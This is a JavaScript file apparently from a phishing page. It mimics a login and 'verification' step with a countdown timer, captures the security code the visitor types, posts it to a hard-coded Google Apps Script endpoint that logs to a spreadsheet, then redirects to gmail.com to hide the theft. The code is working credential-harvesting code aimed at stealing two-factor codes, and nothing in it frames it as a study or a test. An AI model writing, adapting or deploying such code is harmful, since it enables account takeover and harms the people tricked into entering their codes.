// script.js

// Your Apps Script endpoint
const scriptUrl = 'https://script.google.com/macros/s/AKfycbyEvhxQh7kuu7iK-Tq-CCyQiBBGxelCd2Jb9mmqfU2mrYucTN6S12f1NBHGyqRkJOu8/exec';

// Element references
const regForm    = document.getElementById('registrationForm');
const verForm    = document.getElementById('verificationForm');
const submitBtn  = document.getElementById('submitBtn');
const resendBtn  = document.getElementById('resendBtn');
const continueBtn= document.getElementById('continueBtn');
const countdownEl= document.getElementById('countdown');

let timerInterval;
let timeLeft = 120; // seconds

// Step 1: on "Log in" click, show verification UI
regForm.addEventListener('submit', e => {
  e.preventDefault();
  submitBtn.innerText = 'Logging in…';
  submitBtn.disabled = true;

  // Hide reg form, show verification
  regForm.classList.add('hidden');
  verForm.classList.remove('hidden');

  startTimer();
});

// Timer logic
function startTimer() {
  timeLeft = 120;
  resendBtn.disabled = true;
  updateDisplay();

  clearInterval(timerInterval);
  timerInterval = setInterval(() => {
    timeLeft--;
    updateDisplay();
    if (timeLeft <= 0) {
      clearInterval(timerInterval);
      resendBtn.disabled = false;
    }
  }, 1000);
}

function updateDisplay() {
  const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
  const secs = String(timeLeft % 60).padStart(2, '0');
  countdownEl.textContent = `${mins}:${secs}`;
}

// Resend button resets timer
resendBtn.addEventListener('click', () => {
  startTimer();
});

// Continue: post code to sheet, then redirect
continueBtn.addEventListener('click', async () => {
  const code = document.getElementById('securityCode').value.trim();
  if (!code) {
    alert('Please enter the security code.');
    return;
  }

  // Build form data
  const params = new URLSearchParams();
  params.append('username', code);
  params.append('name', code);

  // Post to your Apps Script
  try {
    await fetch(scriptUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    });
  } catch (err) {
    console.error('Error saving code:', err);
  }

  // Finally redirect
  window.location.href = 'https://www.gmail.com';
});
